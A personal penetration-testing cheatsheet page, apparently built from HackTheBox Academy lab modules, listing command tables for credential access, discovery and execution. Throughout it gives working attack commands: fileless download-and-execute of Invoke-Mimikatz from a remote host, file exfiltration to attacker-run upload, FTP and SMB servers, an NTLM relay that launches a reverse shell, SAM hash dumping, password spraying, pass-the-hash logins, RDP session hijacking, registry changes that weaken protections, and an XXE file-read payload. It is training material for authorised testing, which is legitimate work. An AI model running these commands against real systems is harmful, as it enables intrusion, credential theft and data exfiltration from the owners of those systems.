---
title: Cheatsheet
permalink: /cheatsheet/
layout: single
author_profile: true
toc: true
search : true
 
---

## Credential Access

### Web-based

| Command | Description |
| ------- | ----------- |

| `**Command**` | **Description** |

| `------------------------------------` | ------------------------ |

| ``locate *2john`` | Locate hashing scripts |

| ``ssh2john.py SSH.private > ssh.hash`` | SSH Key to hash via john |

| ``john --wordlist=WORDLIST ssh.hash`` | Crack hash using john |

| ``john ssh.hash --show`` | Show cracked hash |

| `-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------` | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |

| `**MD and Base64 File encoding**` |  |

| ``md5sum id_rsa`` | Checks md value of a file in linux |

| ``cat id_rsa \|base64 -w 0;echo`` | File to base64 - encode from linux |

| ``[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))`` | Encode File Using PowerShell |

| ``echo BASE64STRING \| base64 -d > hosts`` | Decode Base64 String in Linux |

| `**File download in windows**` |  |

| ``[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("Base 64 string"))`` | Decoding the base64 string in windows -PWSH |

| ``Get-FileHash C:\Users\Public\id_rsa -Algorithm md5`` | Checking the md value of a file in windows -PWSH |

| ``IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')` **OR** `(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') \| IEX`` | PowerShell DownloadString - Fileless Method -PWSH |

| ``Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1`` | From PowerShell 3.0 onwards, the Invoke-WebRequest cmdlet is also available, but it is noticeably slower at downloading files. -PWSH |

| ``Invoke-WebRequest https://<ip>/PowerView.ps1 \| IEX`` | There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. This can be bypassed using the parameter -UseBasicParsing. -PWSH |

| ``IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')`` | Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command -PWSH |

| `**SMB File Sharing**` |  |

| ``sudo impacket-smbserver share -smb2support /tmp/smbshare` **OR** `sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test`` | We can use SMB to download files from our Pwnbox easily. We need to create an SMB server in our Pwnbox with smbserver.py from Impacket |

| ``copy \\192.168.220.133\share\nc.exe` **OR** `net use n: \\192.168.220.133\share /user:test test`` | Copy a File from the SMB Server -CMD |

| `**FTP File Sharing**` |  |

| ``sudo pip3 install pyftpdlib`` | Installing the FTP Server Python3 Module - pyftpdlib |

| ``sudo python3 -m pyftpdlib --port 21`` | Setting up a Python3 FTP Server |

| ``(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftp-file.txt')`` | Transfering Files from an FTP Server Using PowerShell |

| `**PowerShell Web Uploads**` |  |

| ``pip3 install uploadserver`` | Installing a Configured WebServer with Upload |

| ``python3 -m uploadserver`` | Installing a Configured WebServer with Upload |

| ``IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')`` | PowerShell Script to Upload a File to Python Upload Server |

| ``Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts`` | Uploading the file using the script |

| `**PowerShell Base64 Web Upload**` |  |

| ``$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))`` | PowerShell Script to Upload a File to Python Upload Server |

| ``Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64`` | Uploading the file using Powershell script |

| ``nc -lvnp 8000`` | We catch the base64 data with Netcat and use the base64 application with the decode option to convert the string to the file. |

| ``echo <base64> \| base64 -d -w 0 \> hosts`` | Decoding |

| `**SMB Uploads**` |  |

| ``sudo pip install wsgidav cheroot`` | Installing WebDav Python modules |

| ``sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous`` | Using the WebDav Python module |

| ``dir \\192.168.49.128\DavWWWRoot`` | Connecting to the Webdav Share -CMD |

| ``copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\`` | Uploading Files using SMB |

| `**FTP Uploads**` |  |

| ``sudo python3 -m pyftpdlib --port 21 --write`` | Starting the upload server |

| ``(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')`` | PowerShell Upload File using ftp |



## Discovery

### Host-based

| Command | Description |
| ------- | ----------- |

| `**Command**` | **Description** |

| `---------------------------------------------------------` | ----------------------------------------------------------------------- |

| ``ftp <FQDN/IP>`` | Interact with the FTP service on the target. |

| ``nc -nv <FQDN/IP> 21`` | Interact with the FTP service on the target. |

| ``telnet <FQDN/IP> 21`` | Interact with the FTP service on the target. |

| ``openssl s_client -connect <FQDN/IP>:21 -starttls ftp`` | Interact with the FTP service on the target using encrypted connection. |

| ``wget -m --no-passive ftp://anonymous:anonymous@<target>`` | Download all available files on the target FTP server. |

| ``get`` | To download a file |

| ``put`` | To upload a file |

| ``find / -type f -name ftp* 2>/dev/null \| grep scripts`` | Nmap FTP Scripts |

| `--------------------------------------------------------` | ------------------------------------------------------------------------------------------------------- |

| ``smbclient -N -L //<FQDN/IP>`` | Null session authentication on SMB and to see available shares |

| ``smbclient //<FQDN/IP>/<share>`` | Connect to a specific SMB share. |

| ``rpcclient -U "" <FQDN/IP>`` | Interaction with the target using RPC. |

| ``samrdump.py <FQDN/IP>`` | Username enumeration using Impacket scripts. |

| ``smbmap -H <FQDN/IP>`` | Enumerating SMB shares. |

| ``crackmapexec smb <FQDN/IP> --shares -u '' -p ''`` | Enumerating SMB shares using null session authentication. |

| ``enum4linux-ng.py <FQDN/IP> -A`` | SMB enumeration using enum4linux. |

| ``samrdump.py 10.129.14.128`` | Impacket - Samrdump.py |

| ``smbmap -H 10.129.14.128`` | Enumerating SMB null session using smbmap |

| ``crackmapexec smb 10.129.14.128 --shares -u '' -p ''`` | Enumerating SMB null session using cme |

| `[Enum4linux](https://github.com/cddmp/enum4linux-ng.git)` | This tool automates many of the SMB queries, but not all, and can return a large amount of information. |

| ``./enum4linux-ng.py 10.129.14.128 -A`` | Enum4Linux-ng - Enumeration |

| `-------------------------------------------------------------------------------------------------------------------------------------------------------------` | ------------------------------------------------ |

| ``showmount -e <FQDN/IP>`` | Show available NFS shares. |

| ``mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock`` | Mount the specific NFS share.umount ./target-NFS |

| `If nfs mounts as Nobody:Nobody change /etc/idmapd.conf to the following `Nobody-User = kali   Nobody-Group = kali` then reread config with `sudo nfsidmap -c`` |  |

| ``umount ./target-NFS`` | Unmount the specific NFS share. |

| ``sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049`` | Nmap nsf scan |

| ``mkdir target-NFS` `sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock` `cd target-NFS`` | Mounting NFS share |

| ``ls -l mnt/nfs/`` | List Contents with Usernames & Group Names |

| ``ls -n mnt/nfs/`` | List Contents with UIDs & GUIDs |

| ``cd ..` `sudo umount ./target-NFS`` | Unmounting |

| `-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------` | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |

| ``dig ns <domain.tld> @<nameserver>`` | NS request to the specific nameserver. |

| ``dig any <domain.tld> @<nameserver>`` | ANY request to the specific nameserver. |

| ``dig axfr <domain.tld> @<nameserver>`` | AXFR request to the specific nameserver / Zone transfer |

| ``dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list <domain.tld>`` | Subdomain brute forcing. |

| ``dig soa www.inlanefreight.com`` | The SOA record is located in a domain's zone file and specifies who is responsible for the operation of the domain and how DNS information for the domain is managed. |

| ``dig CH TXT version.bind 10.129.120.85`` | Sometimes it is also possible to query a DNS server's version using a class CHAOS query and type TXT. However, this entry must exist on the DNS server. For this, we could use the following command |

| ``for sub in $(cat /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 \| grep -v ';\|SOA' \| sed -r '/^\s*$/d' \| grep $sub \| tee -a subdomains.txt;done`` | Subdomain bruteforcing(command might be wrong bc of md lang use the module) |

| ``dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb`` | Many different tools can be used for this, and most of them work in the same way. One of these tools is, for example DNSenum. Also we can perform automatic dns enum using this tool |

| `See Attacking DNS` |  |

| `----------------------------------------------------------` | --------------------------------------------------------------------------------------------------------------------------- |

| ``telnet <FQDN/IP> 25`` | Connect to the smtp server |

| `AUTH PLAIN` | AUTH is a service extension used to authenticate the client. |

| `HELO` | The client logs in with its computer name and thus starts the session. |

| `MAIL FROM` | The client names the email sender. |

| `RCPT TO` | The client names the email recipient. |

| `DATA` | The client initiates the transmission of the email. |

| `RSET` | The client aborts the initiated transmission but keeps the connection between client and server. |

| `VRFY` | The client checks if a mailbox is available for message transfer. |

| `EXPN` | The client also checks if a mailbox is available for messaging with this command. |

| `NOOP` | The client requests a response from the server to prevent disconnection due to time-out. |

| `QUIT` | The client terminates the session. |

| ``sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v`` | we can also use the smtp-open-relay NSE script to identify the target SMTP server as an open relay using 16 different tests |

| `------------------------------------------------------` | --------------------------------------------------------------------------------------------------------- |

| ``curl -k 'imaps://<FQDN/IP>' --user <user>:<password>`` | Log in to the IMAPS service using cURL. |

| ``openssl s_client -connect <FQDN/IP>:imaps`` | Connect to the IMAPS service. |

| ``openssl s_client -connect <FQDN/IP>:pop3s`` | Connect to the POP3s service. |

| ``curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd`` | Connect to the IMAPS service. |

| `**IMAP Commands**` | **Description** |

| `LOGIN username password` | User's login. |

| `LIST "" \*` | Lists all directories. |

| `CREATE "INBOX"` | Creates a mailbox with a specified name. |

| `DELETE "INBOX"` | Deletes a mailbox. |

| `RENAME "ToRead" "Important"` | Renames a mailbox. |

| `LSUB "" \*` | Returns a subset of names from the set of names that the User has declared as being active or subscribed. |

| `SELECT INBOX` | Selects a mailbox so that messages in the mailbox can be accessed. |

| `UNSELECT INBOX` | Exits the selected mailbox. |

| `FETCH <ID> all` | Retrieves data associated with a message in the mailbox. |

| `CLOSE` | Removes all messages with the Deleted flag set. |

| `LOGOUT` | Closes the connection with the IMAP server. |

| `**POP3 Commands**` | **Description** |

| `USER username` | Identifies the user. |

| `PASS password` | Authentication of the user using its password. |

| `STAT` | Requests the number of saved emails from the server. |

| `LIST` | Requests from the server the number and size of all emails. |

| `RETR id` | Requests the server to deliver the requested email by ID. |

| `DELE id` | Requests the server to delete the requested email by ID. |

| `CAPA` | Requests the server to display the server capabilities. |

| `RSET` | Requests the server to reset the transmitted information. |

| `QUIT` | Closes the connection with the POP3 server. |

| `----------------------------------` | ---------------------------------------------------- |

| ``nslookup $TARGET`` | Identify the `A` record for the target domain. |

| ``nslookup -query=A $TARGET`` | Identify the `A` record for the target domain. |

| ``dig $TARGET @<nameserver/IP>`` | Identify the `A` record for the target domain. |

| ``dig a $TARGET @<nameserver/IP>`` | Identify the `A` record for the target domain. |

| ``nslookup -query=PTR <IP>`` | Identify the `PTR` record for the target IP address. |

| ``dig -x <IP> @<nameserver/IP>`` | Identify the `PTR` record for the target IP address. |

| ``nslookup -query=ANY $TARGET`` | Identify `ANY` records for the target domain. |

| ``dig any $TARGET @<nameserver/IP>`` | Identify `ANY` records for the target domain. |

| ``nslookup -query=TXT $TARGET`` | Identify the `TXT` records for the target domain. |

| ``dig txt $TARGET @<nameserver/IP>`` | Identify the `TXT` records for the target domain. |

| ``nslookup -query=MX $TARGET`` | Identify the `MX` records for the target domain. |

| ``dig mx $TARGET @<nameserver/IP>`` | Identify the `MX` records for the target domain. |

| ``whois $TARGET`` | WHOIS lookup for the target. |

| `**Resource/Command**` | **Description** |

| `------------------------------------------------------` | ------------------------------------------------------------------------------------ |

| ``Netcraft`` | [https://www.netcraft.com/](https://www.netcraft.com/) |

| ``WayBackMachine`` | [http://web.archive.org/](http://web.archive.org/) |

| ``WayBackURLs`` | [https://github.com/tomnomnom/waybackurls](https://github.com/tomnomnom/waybackurls) |

| ``waybackurls -dates https://$TARGET > waybackurls.txt`` | Crawling URLs from a domain with the date it was obtained. |

| `----------------------------------------------------------------------------` | ------------------------------------------------------------ |

| ``ftp 192.168.2.142`` | Connecting to the FTP server using the `ftp` client. |

| ``nc -v 192.168.2.142 21`` | Connecting to the FTP server using `netcat`. |

| ``hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142`` | Brute-forcing the FTP service. |

| ``medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp`` | Brute Forcing with Medusa |

| ``nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2`` | The Nmap -b flag can be used to perform an FTP bounce attack |

| `Auto enumeration` |  |

| ``Metasploit auxiliary/scanner/smtp/smtp_enum  `` | Metersploit module for enumeration |

| ``smtp-user-enum -M <MODE> -u <USER_FILE> -t <IP>`` | Modes are above. VRFY can be used to bruteforce users |

| ``nmap --script smtp-enum-users <IP>`` | nmap script for enumeration of users. |

| `----------------------------------------------------------------` | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |

| ``dig AXFR @ns1.inlanefreight.htb inlanefreight.htb`` | Perform an AXFR zone transfer attempt against a specific name server. |

| ``fierce --domain zonetransfer.me`` | Tools like Fierce can also be used to enumerate all DNS servers of the root domain and scan for a DNS zone transfer |

| ``subfinder -d inlanefreight.com -v`` | Brute-forcing subdomains. |

| ``./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt`` | An excellent alternative is a tool called Subbrute. This tool allows us to use self-defined resolvers and perform pure DNS brute-forcing attacks during internal penetration tests on hosts that do not have Internet access. |

| ``host support.inlanefreight.com`` | DNS lookup for the specified subdomain. |

| `----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------` | -------------------------------------------------- |

| ``.\AspDotNetWrapper.exe --keypath .\MachineKeys.txt --TargetPagePath "/PATH" --encrypteddata VIEWSTATE --decrypt --purpose=viewstate --modifier=VIEWSTATEGENERATORVALUE -f out.txt --IISDirPath="/"`` | Bruteforce encryption key for Encrypted Viewstate. |

| `------------------------------------------------------` | --------------------------------------- |

| `---------------------------------------------------------------------------------------------------------------` | -------------------------------------------------------------------------------------------------------- |

| ``smbclient -N -L //10.129.14.128`` | Null-session testing against the SMB service. |

| ``smbmap -H 10.129.14.128`` | Network share enumeration using `smbmap`. |

| ``smbmap -H 10.129.14.128 -r notes`` | Recursive network share enumeration using `smbmap`. |

| ``smbmap -H 10.129.14.128 --download "notes\note.txt"`` | Download a specific file from the shared folder. |

| ``smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"`` | Upload a specific file to the shared folder. |

| ``rpcclient -U'%' 10.10.110.17`` | Null-session with the `rpcclient`. |

| ``./enum4linux-ng.py 10.10.11.45 -A -C`` | Automated enumeratition of the SMB service using `enum4linux-ng`. |

| ``crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'`` | Password spraying against different users from a list. |

| ``impacket-psexec administrator:'Password123!'@10.10.110.17`` | Connect to the SMB service using the `impacket-psexec`. |

| ``crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec`` | Execute a command over the SMB service using `crackmapexec`. |

| ``crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users`` | Enumerating Logged-on users. |

| ``crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam`` | Extract hashes from the SAM database. |

| ``crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE`` | Use the Pass-The-Hash technique to authenticate on the target host. |

| ``impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146`` | Dump the SAM database using `impacket-ntlmrelayx`. |

| ``impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>`` | Execute a PowerShell based reverse shell using `impacket-ntlmrelayx`. |

| ``sudo responder -I ens33`` | We can also abuse the SMB protocol by creating a fake SMB Server to capture users' NetNTLM v1/v2 hashes. |

| `-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------` | -------------------------------------------------------- |

| ``mssqlclient.py <user>@<FQDN/IP> -windows-auth`` | Log in to the MSSQL server using Windows authentication. |

| ``locate mssqlclient.py`` | Locate mssqlclient.py |

| ``sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248`` | NMAP MSSQL Script Scan |

| ``sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*`` | Scanning MySQL Server |

| ``mysql -u root -pP4SSw0rd -h 10.129.14.128`` | Interaction with the MySQL Server |

| `-------------------------------------------------------------------------------------------------------` | ------------------------------------------------ |

| `` |  |

| ``mkdir target-NFS` `sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock` `cd target-NFS` `tree .`` | Mounting NFS share |

| `--------------------------------------------------------------------------------------------------------------------------------------------------------------` | ------------------------------------------------------------------------------- |

| ``crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'`` | Password spraying against the RDP service. |

| ``hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp`` | Brute-forcing the RDP service. |

| ``rdesktop -u admin -p password123 192.168.2.143`` | Connect to the RDP service using `rdesktop` in Linux. |

| ``tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}`` | Impersonate a user without its password. SESSION HIJACKING |

| ``net start sessionhijack`` | Execute the RDP session hijack. |

| ``crackmapexec smb IP -u USER -H NTLMHASH --local-auth -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'`` | Add DisableRestrictedAdmin reg key via cme |

| ``reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`` | Enable "Restricted Admin Mode" on the target Windows host. |

| ``xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA`` | Use the Pass-The-Hash technique to login on the target host without a password. |

| `---------------------------------------------------------------------------------------------------------------------------------------------` | ------------------------------------------------------------ |

| ``mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit`` | Pass the Hash from Windows Using Mimikatz -CMD |

| `[Invoke-TheHash with SMB / Invoke-TheHash with WMI](https://academy.hackthebox.com/module/147/section/1638)` |  |

| ``impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453`` | Pass the Hash with Impacket psexec (Linux) |

| ``crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453`` | Pass the Hash with CrackMapExec |

| ``crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami`` | Pass the Hash command execution with CrackMapExec |

| ``evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453`` | Pass the Hash with evil-winrm |

| ``reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`` | Enable Restricted Admin Mode to Allow PtH from xfreerdp -CMD |

| ``xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B`` | Pass the Hash Using RDP |

| `---` | --- |

| ``wmic useraccount where name="netadm" get sid`` | Find user SID |

| ``sc.exe sdshow DNS`` | Get permissions for DNS Service |

| ``sc start dns`` | Start DNS |

| `**Commands**` | **Description** |

| `------------------------------------------------------------` | ------------------------------------------------ |

| `[ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)` | Information dumper via LDAP |

| `[adidnsdump](https://github.com/dirkjanm/adidnsdump)` | Integrated DNS dumping by any authenticated user |

| `[ACLight](https://github.com/cyberark/ACLight)` | Advanced Discovery of Privileged Accounts |

| `[ADRecon](https://github.com/sense-of-security/ADRecon)` | Detailed Active Directory Recon Tool |



### Network-based

| Command | Description |
| ------- | ----------- |

| ``for i in $(cat ip-addresses.txt);do shodan host $i;done`` | Scan each IP address in a list using Shodan. |

| ``sudo nmap 10.129.14.128 -sVC -p3306 --script mysql*`` | Scanning MySQL Server |

| ``sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248`` | NMAP MSSQL Script Scan |

| ``sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute`` | nmap SID Bruteforce |

| ``sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local`` | Nmap |

| ``sudo nmap -sV -p 873 127.0.0.1`` | Scanning for Rsync |

| ``gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt`` | Run a directory scan on a website |

| ``gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt`` | Run a sub-domain scan on a website |

| `open` | This indicates that the connection to the scanned port has been established. These connections can be TCP connections, UDP datagrams as well as SCTP associations. |

| `closed` | When the port is shown as closed, the TCP protocol indicates that the packet we received back contains an RST flag. This scanning method can also be used to determine if our target is alive or not. |

| `filtered` | Nmap cannot correctly identify whether the scanned port is open or closed because either no response is returned from the target for the port or we get an error code from the target. |

| `unfiltered` | This state of a port only occurs during the TCP-ACK scan and means that the port is accessible, but it cannot be determined whether it is open or closed. |

| `closed/filtered` | This state only occurs in the IP ID idle scans and indicates that it was impossible to determine if the scanned port is closed or filtered by a firewall. |

| ``-sn`` | Disables port scanning. |

| ``-PE`` | Performs the ping scan by using ICMP Echo Requests against the target. |

| ``--top-ports=<num>`` | Scans the specified top ports that have been defined as most frequent. |

| ``-p-`` | Scan all ports. |

| ``-p22-110`` | Scan all ports between 22 and 110. |

| ``-p22,25`` | Scans only the specified ports 22 and 25. |

| ``-F`` | Scans top 100 ports. |

| ``-sS`` | Performs an TCP SYN-Scan. |

| ``-sA`` | Performs an TCP ACK-Scan. |

| ``-sU`` | Performs an UDP Scan. |

| ``-sV`` | Scans the discovered services for their versions. |

| ``-sC`` | Perform a Script Scan with scripts that are categorized as "default". |

| ``--script <script>`` | Performs a Script Scan by using the specified scripts. |

| ``-O`` | Performs an OS Detection Scan to determine the OS of the target. |

| ``-A`` | Performs OS Detection, Service Detection, and traceroute scans. |

| ``-D RND:5`` | Sets the number of random Decoys that will be used to scan the target. |

| ``-e`` | Specifies the network interface that is used for the scan. |

| ``-S 10.10.10.200`` | Specifies the source IP address for the scan. |

| ``-g`` | Specifies the source port for the scan. |

| ``--max-retries <num>`` | Sets the number of retries for scans of specific ports. |

| ``--stats-every=5s`` | Displays scan's status every 5 seconds. |

| ``-v/-vv`` | Displays verbose output during the scan. |

| ``sudo nmap 10.129.2.0/24 -sn -oA tnet \| grep for \| cut -d" " -f5`` | Scan Network Range in a subnet / Ping sweep using nmap |

| ``sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5`` | Scan by Using Decoys |

| ``sudo nmap 10.129.2.28 -n -Pn -p445 -O`` | Testing Firewall Rule |

| ``sudo nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200 -e tun0`` | Scan by Using Different Source IP |

| ``sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53`` | DNS Proxying / SYN-Scan From DNS Port |

| ``nmap -sL 172.16.7.60`` | Get hostname of a host |

| `**Certutil**` | Certutil can be used to download arbitrary files. It is available in all Windows versions and has been a popular file transfer technique, serving as a defacto wget for Windows. However, the Antimalware Scan Interface (AMSI) currently detects this as malicious Certutil usage. |

| ``db_nmap`` | Use Nmap and place results in a database. (Normal Nmap syntax is supported, such as –sT –v –P0.) |

| ``nmap -sT -p22,3306 <IPaddressofTarget>`` | Nmap command used to scan a target for open ports allowing SSH or MySQL connections. |

| ``nmap -v -sV -p1234 localhost`` | Nmap command used to scan a host through a connection that has been made on local port `1234`. |

| ``proxychains nmap -v -sn 172.16.5.1-200`` | Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against the hosts in the specified range `172.16.5.1-200` with increased verbosity (`-v`) disabling ping scan (`-sn`). |

| ``proxychains nmap -v -Pn -sT 172.16.5.19`` | Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against 172.16.5.19 with increased verbosity (`-v`), disabling ping discover (`-Pn`), and using TCP connect scan type (`-sT`). |

| ``msf6 > search rdp_scanner`` | Metasploit search that attempts to find a module called `rdp_scanner`. |

| ``sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum`` | Performs an nmap scan that with OS detection, version detection, script scanning, and traceroute enabled (`-A`) based on a list of hosts (`hosts.txt`) specified in the file proceeding `-iL`. Then outputs the scan results to the file specified after the `-oN`option. Performed from a Linux-based host |

| ``sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap`` | Runs `scanner.py` to check if a target system is vulnerable to `noPac`/`Sam_The_Admin` from a Linux-based host. |



## Execution

### Web-based

| Command | Description |
| ------- | ----------- |

| `[Hacktricks](https://book.hacktricks.xyz/)` | The GOAT resource |

| ``ssh <user>@<FQDN/IP> -o PreferredAuthentications=password`` | Enforce password-based authentication. |

| ``gobuster vhost -w /path/to/wordlist.txt -u http://example.com --append-domain`` | Gobuster bruteforce, --append-domain needed to search for higher level domain. E.G LIST.example.com |

| ``ctrl+U`` | View page source (in Firefox) |

| ``<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">`` | Read PHP source code with base64 encode filter |

| ``crackmapexec winrm <ip> -u user.list -p password.list`` | Uses CrackMapExec over WinRM to attempt to brute force user names and passwords specified hosted on a target. |

| `**Command**` | **Description** |

| `---` | --- |

| ``find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \; `` | Find applications with capabilities set within specific path |

| ``getcap -r / 2>/dev/null`` | Find applications with set recursive |

| ``lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true`` | Configure device. Source is source of container. Path is mount location |

| `(CVE-2021-22555)[https://github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555]` | Vulnerable kernel versions: 2.6 - 5.11 - `gcc -m32 -static exploit.c -o exploit` |

| `(CVE-2023-32233)[https://github.com/Liuk3r/CVE-2023-32233]` | Linux Kernal up to version 6.3.1 |

| ``xfreerdp /v:<target ip> /u:htb-student`` | RDP to lab target |

| ``ipconfig /all`` | Get interface, IP address and DNS information |

| ``arp -a`` | Review ARP table |

| ``route print`` | Review routing table |

| ``Get-MpComputerStatus`` | Check Windows Defender status |

| ``Get-AppLockerPolicy -Effective \| select -ExpandProperty RuleCollections`` | List AppLocker rules |

| ``Get-AppLockerPolicy -Local \| Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone`` | Test AppLocker policy |

| ``set`` | Display all environment variables |

| ``systeminfo`` | View detailed system configuration information |

| ``wmic qfe`` | Get patches and updates |

| ``wmic product get name`` | Get installed programs |

| ``tasklist /svc`` | Display running processes |

| ``query user`` | Get logged-in users |

| ``echo %USERNAME%`` | Get current user |

| ``whoami /priv`` | View current user privileges |

| ``whoami /groups`` | View current user group information |

| ``net user`` | Get all system users |

| ``net localgroup`` | Get all system groups |

| ``net localgroup administrators`` | View details about a group |

| ``net accounts`` | Get passsword policy |

| ``netstat -ano`` | Display active network connections |

| ``pipelist.exe /accepteula`` | List named pipes |

| ``gci \\.\pipe\`` | List named pipes with PowerShell |

| ``accesschk.exe /accepteula \\.\Pipe\lsass -v`` | Review permissions on a named pipe |

| ``.\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"") `` | [Script](https://github.com/decoder-it/psgetsystem) RCE using SeDebugPrivilege as System |

| `CVE` | Description |

| `:-----------:` | :-------------------------------------------------------------------------------------------------------------------------------- |

| `CVE-2002-1214` | ms02_063_pptp_dos - exploits a kernel based overflow when sending abnormal PPTP Control Data packets - code execution, DoS |

| `CVE-2003-0352` | ms03_026_dcom - exploits a stack buffer overflow in the RPCSS service |

| `CVE-2003-0533` | MS04-011 - ms04_011_lsass - exploits a stack buffer overflow in the LSASS service |

| `CVE-2003-0719` | ms04_011_pct - exploits a buffer overflow in the Microsoft Windows SSL PCT protocol stack - Private communication target overflow |

